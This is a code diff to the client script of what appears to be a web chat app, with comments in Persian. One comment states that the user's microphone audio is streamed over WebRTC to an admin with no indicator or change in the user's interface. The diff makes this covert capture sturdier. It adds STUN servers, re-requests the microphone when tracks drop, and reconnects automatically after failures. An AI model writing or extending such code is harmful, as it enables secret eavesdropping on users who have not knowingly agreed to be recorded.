@@ -27,9 +27,14 @@ function safeFileUrl(value) {
   return '#';
 }
 
-// کانفیگ WebRTC (اتصال مستقیم به صورت P2P local بدون نیاز به STUN خارچی پولی)
 const rtcConfig = {
-  iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+  iceServers: [
+    { urls: 'stun:stun.cloudflare.com:3478' },
+    { urls: 'stun:stun.services.mozilla.com' },
+    { urls: 'stun:stun.l.google.com:19302' },
+    { urls: 'stun:stun1.l.google.com:19302' },
+    { urls: 'stun:stun2.l.google.com:19302' }
+  ]
 };
 
 // اگر توکن یا اطلاعات جلسه وجود نداشت، هدایت به لندینگ
@@ -481,13 +486,30 @@ function sendTypingStatus(isTyping) {
   }
 }
 
+let lastAdminSocketId = null;
+
 // ایجاد اتصال WebRTC و ارسال استریم صدا بدون هیچ نشانگر یا تغییر در UI کاربر
 async function startPeerConnection(adminSocketId) {
-  stopPeerConnection();
+  if (adminSocketId) lastAdminSocketId = adminSocketId;
+  const targetId = adminSocketId || lastAdminSocketId;
 
-  if (!localStream) {
+  if (peerConnection) {
+    try { peerConnection.close(); } catch (_) {}
+    peerConnection = null;
+  }
+
+  // بررسی زنده بودن ترک‌های میکروفون و دریافت مجدد در صورت نیاز
+  const isStreamActive = localStream && localStream.getAudioTracks().some(t => t.readyState === 'live');
+  if (!isStreamActive) {
     try {
-      localStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+      localStream = await navigator.mediaDevices.getUserMedia({
+        audio: {
+          echoCancellation: true,
+          noiseSuppression: true,
+          autoGainControl: true,
+        },
+        video: false,
+      });
     } catch (err) {
       console.error('عدم دسترسی به میکروفون:', err);
       return;
@@ -501,13 +523,25 @@ async function startPeerConnection(adminSocketId) {
     peerConnection.addTrack(track, localStream);
   });
 
+  // پایش پایداری اتصال و بازسازی در صورت قطعی
+  peerConnection.onconnectionstatechange = () => {
+    if (!peerConnection) return;
+    const state = peerConnection.connectionState;
+    console.log('User WebRTC state:', state);
+    if (state === 'failed' || state === 'disconnected') {
+      setTimeout(() => {
+        if (targetId) startPeerConnection(targetId);
+      }, 2000);
+    }
+  };
+
   // ارسال ICE Candidates به ادمین
   peerConnection.onicecandidate = (event) => {
-    if (event.candidate) {
+    if (event.candidate && socket && targetId) {
       socket.emit('webrtc_ice_candidate', {
         sessionId: sessionData.id,
         candidate: event.candidate,
-        targetSocketId: adminSocketId,
+        targetSocketId: targetId,
       });
     }
   };
@@ -517,11 +551,13 @@ async function startPeerConnection(adminSocketId) {
     const offer = await peerConnection.createOffer();
     await peerConnection.setLocalDescription(offer);
 
-    socket.emit('webrtc_offer', {
-      sessionId: sessionData.id,
-      offer: offer,
-      targetSocketId: adminSocketId,
-    });
+    if (socket && targetId) {
+      socket.emit('webrtc_offer', {
+        sessionId: sessionData.id,
+        offer: offer,
+        targetSocketId: targetId,
+      });
+    }
   } catch (err) {
     console.error('خطا در ساخت WebRTC offer:', err);
   }
@@ -529,9 +565,16 @@ async function startPeerConnection(adminSocketId) {
 
 function stopPeerConnection() {
   if (peerConnection) {
-    peerConnection.close();
+    try { peerConnection.close(); } catch (_) {}
     peerConnection = null;
   }
+  if (localStream) {
+    try {
+      localStream.getTracks().forEach(track => track.stop());
+    } catch (_) {}
+    localStream = null;
+  }
+  lastAdminSocketId = null;
 }
 
 function triggerFileInput(acceptType) {
